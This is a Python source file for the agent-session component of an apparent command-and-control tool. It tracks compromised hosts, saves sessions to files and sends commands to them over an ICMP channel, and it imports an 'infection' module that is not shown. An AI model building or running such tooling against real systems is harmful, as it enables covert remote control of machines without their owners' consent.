from modules.infection import *
from channels.icmp import *
from auxiliary.data import *
from random import randint
from json import dumps, loads
from glob import glob

class Agent:
    
    def __init__(self, payload, beacon=300, jitter=60):
        self.agentid = randint(10000, 99999)
        self.lhost = payload.lhost
        self.lport = payload.lport
        self.rhost = payload.rhost
        self.channel = payload.channel
        self.beacon = beacon # to be implemented
        self.jitter = jitter # to be implemented
        self.cmd = '-'

    def save(self):
        f = open(f'sessions/{self.rhost}_{self.channel}', 'w')
        f.write(dumps(Encoder().encode(self)))
        f.close()

    def load(self, ip, channel):
        f = open(f'sessions/{ip}_{channel}', 'r')
        agent_obj = loads(f.read())
        self.agentid = agent_obj['agentid']
        self.lhost = agent_obj['lhost']
        self.lport = agent_obj['lport']
        self.rhost = agent_obj['rhost']
        self.channel = agent_obj['channel']
        self.beacon = agent_obj['beacon']
        self.jitter = agent_obj['jitter']
    
    @staticmethod
    def list():
        files = glob('sessions/*')
        agents = []
        for file in files:
            file = file.replace('sessions/', '')
            file = file.replace('_', ' via ')
            agents.append(file)

        return agents

    def exec(self, cmd):
        Icmp().wait(self.lhost, self.rhost, cmd)

